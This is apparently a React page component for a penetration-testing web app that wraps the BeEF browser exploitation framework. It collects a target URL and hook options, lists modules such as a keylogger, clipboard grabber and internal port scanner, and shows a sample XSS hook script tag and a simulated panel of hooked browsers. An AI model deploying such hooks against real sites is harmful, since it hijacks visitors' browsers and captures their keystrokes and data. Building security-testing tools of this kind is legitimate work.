import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import Terminal from "@/components/terminal";
import { useTerminal } from "@/hooks/use-terminal";
import { Card, CardContent } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Separator } from "@/components/ui/separator";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Button } from "@/components/ui/button";
import { 
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage
} from "@/components/ui/form";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Checkbox } from "@/components/ui/checkbox";
import { Copy } from "lucide-react";
import { Loader2 } from "lucide-react";

// Form validation schema
const formSchema = z.object({
  target: z.string().url({ message: "Please enter a valid URL" }),
  hookUrl: z.string().url({ message: "Please enter a valid hook URL" }).optional(),
  payloadType: z.enum(['invisible', 'visible', 'custom']),
  customHook: z.string().optional(),
  includeJquery: z.boolean().default(false),
  autorun: z.boolean().default(false),
  modules: z.array(z.string()).default([])
});

type FormValues = z.infer<typeof formSchema>;

// Available BeEF modules
const availableModules = [
  { id: "Chrome Extensions", label: "Chrome Extensions Detection" },
  { id: "Clipboard Grabber", label: "Clipboard Grabber" },
  { id: "Fingerprinting", label: "Browser Fingerprinting" },
  { id: "Keylogger", label: "Keyboard Logging" },
  { id: "Port Scanner", label: "Internal Port Scanner" },
  { id: "Screenshot", label: "Screen Capture" },
  { id: "Social Engineering", label: "Social Engineering Templates" },
  { id: "Network Discovery", label: "Internal Network Discovery" },
  { id: "WebRTC", label: "WebRTC IP Detection" }
];

export default function BeefXss() {
  const { toast } = useToast();
  const { addSystemLine, addErrorLine, addInfoLine, clear } = useTerminal();
  
  const [loading, setLoading] = useState(false);
  const [activeTab, setActiveTab] = useState("generator");
  const [result, setResult] = useState<any>(null);
  
  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      target: "",
      hookUrl: "http://localhost:3000/hook.js",
      payloadType: "invisible",
      customHook: "",
      includeJquery: false,
      autorun: false,
      modules: ["Fingerprinting", "Chrome Extensions", "WebRTC"]
    }
  });
  
  const onSubmit = async (data: FormValues) => {
    try {
      setLoading(true);
      clear();
      addSystemLine("Initializing BeEF XSS hook generator...");
      
      const response = await apiRequest("/api/security/beef-xss", {
        method: "POST",
        data
      });
      
      addInfoLine(`Target: ${data.target}`);
      addInfoLine(`Payload type: ${data.payloadType}`);
      
      if (response.status === "success") {
        addSystemLine("BeEF XSS hook generated successfully!");
        
        // Log details about the generated hook
        addInfoLine(`Hook URL: ${response.hookUrl}`);
        addInfoLine(`Session ID: ${response.sessionId}`);
        
        if (response.commandModules && response.commandModules.length > 0) {
          addSystemLine("Enabled command modules:");
          response.commandModules.forEach((module: any) => {
            if (module.enabled) {
              addInfoLine(`- ${module.name}: ${module.description}`);
            }
          });
        }
        
        if (response.vulnerabilityReport) {
          addSystemLine(`Vulnerability assessment: ${response.vulnerabilityReport.severity} risk`);
          response.vulnerabilityReport.findings.forEach((finding: any) => {
            addErrorLine(`- ${finding.type}: ${finding.description}`);
          });
        }
        
        setResult(response);
        setActiveTab("results");
      } else {
        addErrorLine("Failed to generate BeEF XSS hook");
        addErrorLine(response.error || "Unknown error occurred");
      }
    } catch (error) {
      addErrorLine("Error occurred while generating BeEF XSS hook");
      console.error("BeEF XSS Error:", error);
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to generate BeEF XSS hook. Please try again."
      });
    } finally {
      setLoading(false);
    }
  };
  
  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copied to clipboard",
      description: "The payload has been copied to your clipboard."
    });
  };
  
  // Render different sections based on active tab
  const renderTabContent = () => {
    switch (activeTab) {
      case "generator":
        return (
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
              <FormField
                control={form.control}
                name="target"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Target URL</FormLabel>
                    <FormControl>
                      <Input placeholder="https://example.com" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <FormField
                  control={form.control}
                  name="hookUrl"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>BeEF Hook URL (Optional)</FormLabel>
                      <FormControl>
                        <Input placeholder="http://localhost:3000/hook.js" {...field} />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                
                <FormField
                  control={form.control}
                  name="payloadType"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Payload Type</FormLabel>
                      <Select 
                        onValueChange={field.onChange} 
                        defaultValue={field.value}
                      >
                        <FormControl>
                          <SelectTrigger>
                            <SelectValue placeholder="Select payload type" />
                          </SelectTrigger>
                        </FormControl>
                        <SelectContent>
                          <SelectItem value="invisible">Invisible (Script)</SelectItem>
                          <SelectItem value="visible">Visible (iframe)</SelectItem>
                          <SelectItem value="custom">Custom Payload</SelectItem>
                        </SelectContent>
                      </Select>
                      <FormMessage />
                    </FormItem>
                  )}
                />
              </div>
              
              {form.watch("payloadType") === "custom" && (
                <FormField
                  control={form.control}
                  name="customHook"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Custom Hook Payload</FormLabel>
                      <FormControl>
                        <Textarea 
                          placeholder="<script src='http://localhost:3000/hook.js'></script>" 
                          className="font-mono h-24" 
                          {...field} 
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
              )}
              
              <div className="space-y-4">
                <Label>Hook Options</Label>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <FormField
                    control={form.control}
                    name="includeJquery"
                    render={({ field }) => (
                      <FormItem className="flex items-center space-x-2">
                        <FormControl>
                          <Checkbox 
                            checked={field.value}
                            onCheckedChange={field.onChange}
                          />
                        </FormControl>
                        <FormLabel className="cursor-pointer font-normal">Include jQuery</FormLabel>
                      </FormItem>
                    )}
                  />
                  
                  <FormField
                    control={form.control}
                    name="autorun"
                    render={({ field }) => (
                      <FormItem className="flex items-center space-x-2">
                        <FormControl>
                          <Checkbox 
                            checked={field.value}
                            onCheckedChange={field.onChange}
                          />
                        </FormControl>
                        <FormLabel className="cursor-pointer font-normal">Auto-run modules</FormLabel>
                      </FormItem>
                    )}
                  />
                </div>
              </div>
              
              <div className="space-y-4">
                <Label>Command Modules</Label>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4 border p-4 rounded">
                  {availableModules.map((module) => (
                    <FormField
                      key={module.id}
                      control={form.control}
                      name="modules"
                      render={({ field }) => (
                        <FormItem className="flex items-center space-x-2">
                          <FormControl>
                            <Checkbox 
                              checked={field.value?.includes(module.id)}
                              onCheckedChange={(checked) => {
                                const currentModules = field.value || [];
                                if (checked) {
                                  field.onChange([...currentModules, module.id]);
                                } else {
                                  field.onChange(currentModules.filter(value => value !== module.id));
                                }
                              }}
                            />
                          </FormControl>
                          <FormLabel className="cursor-pointer font-normal">{module.label}</FormLabel>
                        </FormItem>
                      )}
                    />
                  ))}
                </div>
              </div>
              
              <Button type="submit" disabled={loading}>
                {loading ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Generating Hook...
                  </>
                ) : (
                  "Generate BeEF XSS Hook"
                )}
              </Button>
            </form>
          </Form>
        );
        
      case "results":
        return result ? (
          <div className="space-y-6">
            <div>
              <h3 className="text-lg font-semibold mb-2">Generated Payload</h3>
              <div className="relative">
                <pre className="bg-secondary/20 p-4 rounded-md overflow-x-auto font-mono text-sm whitespace-pre-wrap">
                  {result.generatedPayload}
                </pre>
                <Button 
                  size="sm" 
                  variant="outline" 
                  className="absolute top-2 right-2"
                  onClick={() => copyToClipboard(result.generatedPayload)}
                >
                  <Copy className="h-4 w-4" />
                </Button>
              </div>
            </div>
            
            <Separator />
            
            <div>
              <h3 className="text-lg font-semibold mb-2">Injection Methods</h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {result.injectionMethods.map((method: any, index: number) => (
                  <Card key={index} className="overflow-hidden">
                    <CardContent className="p-4">
                      <h4 className="font-semibold text-primary">{method.method}</h4>
                      <p className="text-sm text-muted-foreground mb-2">{method.description}</p>
                      <div className="relative">
                        <pre className="bg-secondary/20 p-3 rounded-sm overflow-x-auto font-mono text-xs mt-2">
                          {method.code}
                        </pre>
                        <Button 
                          size="sm" 
                          variant="ghost" 
                          className="absolute top-1 right-1 h-6 w-6 p-0"
                          onClick={() => copyToClipboard(method.code)}
                        >
                          <Copy className="h-3 w-3" />
                        </Button>
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>
            </div>
            
            <Separator />
            
            {result.vulnerabilityReport && (
              <div>
                <h3 className="text-lg font-semibold mb-2">Vulnerability Assessment</h3>
                <div className="bg-secondary/20 p-4 rounded-md">
                  <div className="flex items-center justify-between mb-2">
                    <span>Severity:</span>
                    <span className={`font-bold ${
                      result.vulnerabilityReport.severity === 'Critical' ? 'text-red-500' :
                      result.vulnerabilityReport.severity === 'High' ? 'text-orange-500' :
                      result.vulnerabilityReport.severity === 'Medium' ? 'text-yellow-500' :
                      'text-green-500'
                    }`}>
                      {result.vulnerabilityReport.severity}
                    </span>
                  </div>
                  
                  <ul className="space-y-2 mt-4">
                    {result.vulnerabilityReport.findings.map((finding: any, index: number) => (
                      <li key={index} className="bg-background/60 p-3 rounded-sm">
                        <span className="font-semibold">{finding.type}</span>: {finding.description}
                        <p className="text-xs text-muted-foreground mt-1">
                          <span className="font-semibold">Recommendation:</span> {finding.recommendation}
                        </p>
                      </li>
                    ))}
                  </ul>
                </div>
              </div>
            )}
            
            <Button 
              variant="outline" 
              onClick={() => setActiveTab("generator")}
              className="mt-4"
            >
              Return to Generator
            </Button>
          </div>
        ) : (
          <div className="flex justify-center items-center h-[200px]">
            <p className="text-muted-foreground">No results yet. Generate a BeEF XSS hook first.</p>
          </div>
        );
        
      case "beef-ui":
        return (
          <div className="space-y-6">
            <div className="bg-secondary/20 p-4 rounded-md">
              <h3 className="font-semibold mb-4">BeEF XSS Control Panel (Web View Simulator)</h3>
              
              {result ? (
                <div className="border border-primary/30 rounded-md overflow-hidden">
                  <div className="bg-secondary/30 p-2 flex justify-between items-center">
                    <div className="font-mono text-xs">BeEF Control Panel - {result.target}</div>
                    <div className="font-mono text-xs text-secondary">Session ID: {result.sessionId}</div>
                  </div>
                  
                  <div className="grid grid-cols-4 min-h-[500px]">
                    {/* Left Panel - Hooked Browsers */}
                    <div className="col-span-1 bg-background/90 p-2 border-r border-primary/30">
                      <div className="font-mono text-xs font-semibold mb-2">Hooked Browsers ({result.onlineHooks || 1})</div>
                      <div className="border border-primary/20 p-2 rounded-sm bg-primary/5 cursor-pointer hover:bg-primary/10">
                        <div className="font-mono text-xs mb-1 text-primary">Online</div>
                        <div className="font-mono text-xs flex justify-between">
                          <span>Chrome</span>
                          <span>Win10</span>
                        </div>
                        <div className="font-mono text-xs text-muted-foreground truncate">
                          {result.target}
                        </div>
                      </div>
                    </div>
                    
                    {/* Main Panel - Command Modules */}
                    <div className="col-span-3 bg-background/80 p-2">
                      <div className="font-mono text-xs font-semibold mb-2">Browser Details</div>
                      
                      <div className="space-y-4">
                        {/* Browser Info */}
                        <div className="border border-primary/20 p-2 rounded-sm bg-primary/5">
                          <table className="w-full text-xs font-mono">
                            <tbody>
                              <tr>
                                <td className="font-semibold p-1">Browser:</td>
                                <td>{result.browserInfo?.browserName} {result.browserInfo?.browserVersion}</td>
                              </tr>
                              <tr>
                                <td className="font-semibold p-1">OS:</td>
                                <td>{result.browserInfo?.os}</td>
                              </tr>
                              <tr>
                                <td className="font-semibold p-1">User Agent:</td>
                                <td className="truncate">{result.browserInfo?.userAgent}</td>
                              </tr>
                              <tr>
                                <td className="font-semibold p-1">Plugins:</td>
                                <td>{result.browserInfo?.plugins?.join(", ")}</td>
                              </tr>
                            </tbody>
                          </table>
                        </div>
                        
                        {/* Command Modules */}
                        <div>
                          <div className="font-mono text-xs font-semibold mb-2">Available Command Modules</div>
                          <div className="grid grid-cols-1 gap-2">
                            {result.commandModules?.filter((module: any) => module.enabled).map((module: any, index: number) => (
                              <div key={index} className="border border-primary/20 p-2 rounded-sm bg-primary/5 cursor-pointer hover:bg-primary/10">
                                <div className="font-mono text-xs font-semibold">{module.name}</div>
                                <div className="font-mono text-xs text-muted-foreground">{module.description}</div>
                              </div>
                            ))}
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              ) : (
                <div className="flex justify-center items-center h-[300px]">
                  <p className="text-muted-foreground">No active BeEF session. Generate a hook first.</p>
                </div>
              )}
            </div>
            
            <div className="text-sm text-muted-foreground bg-secondary/10 p-4 rounded-md">
              <p>This is a simulated view of the BeEF control panel UI. In a real BeEF deployment, you would need to:</p>
              <ol className="list-decimal list-inside mt-2 space-y-1">
                <li>Install BeEF on your server (e.g., <code className="bg-secondary/20 px-1 rounded">git clone https://github.com/beefproject/beef</code>)</li>
                <li>Configure BeEF (edit <code className="bg-secondary/20 px-1 rounded">config.yaml</code>)</li>
                <li>Start the BeEF server (e.g., <code className="bg-secondary/20 px-1 rounded">./beef</code>)</li>
                <li>Use the generated XSS payloads to hook browser sessions</li>
                <li>Access the BeEF control panel (default: <code className="bg-secondary/20 px-1 rounded">http://localhost:3000/ui/panel</code>)</li>
              </ol>
            </div>
          </div>
        );
        
      case "terminal":
        return <Terminal lines={[]} />;
        
      default:
        return null;
    }
  };
  
  return (
    <div className="space-y-6">
      <div>
        <h2 className="text-2xl font-semibold mb-2">BeEF XSS Framework</h2>
        <p className="text-muted-foreground">
          Browser Exploitation Framework (BeEF) is a penetration testing tool that focuses on the web browser.
          This tool helps security professionals assess the security posture of web applications by leveraging
          cross-site scripting (XSS) vulnerabilities.
        </p>
      </div>
      
      <Tabs defaultValue="generator" value={activeTab} onValueChange={setActiveTab}>
        <TabsList className="grid grid-cols-4">
          <TabsTrigger value="generator">Hook Generator</TabsTrigger>
          <TabsTrigger value="results">Hook Results</TabsTrigger>
          <TabsTrigger value="beef-ui">BeEF Control Panel</TabsTrigger>
          <TabsTrigger value="terminal">Terminal Output</TabsTrigger>
        </TabsList>
        
        <TabsContent value={activeTab} className="mt-6">
          {renderTabContent()}
        </TabsContent>
      </Tabs>
      
      <div className="bg-secondary/10 p-4 rounded-md text-sm">
        <h3 className="font-semibold mb-2">⚠️ Ethical Usage Warning</h3>
        <p>
          BeEF is a powerful security testing tool that should only be used on systems you own or have explicit
          permission to test. Unauthorized use of BeEF against targets without permission is illegal and unethical.
          This tool is provided for educational purposes and legitimate security testing only.
        </p>
      </div>
    </div>
  );
}